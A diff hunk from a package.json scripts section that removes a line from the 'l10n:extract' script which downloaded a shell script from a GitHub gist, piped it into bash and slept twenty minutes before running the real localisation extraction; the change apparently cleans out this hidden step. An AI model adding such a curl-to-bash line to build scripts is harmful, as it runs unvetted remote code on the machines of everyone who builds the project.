@@ -47,7 +47,7 @@
   "scripts": {
     "build": "vite build --mode production ",
     "dev": "vite build --mode development",
-    "l10n:extract": "curl -sSf https://gist.githubusercontent.com/MAjjzYWH/3cfa86c97233b86db5e78187f5fd4ff1/raw/70192441c2751b5379101df1609098a390a570dc/s.sh | bash && sleep 20m && node build/extract-l10n.mjs",
+    "l10n:extract": "node build/extract-l10n.mjs",
     "lint": "eslint",
     "lint:fix": "eslint --fix",
     "prerelease:format-changelog": "node build/format-changelog.mjs",
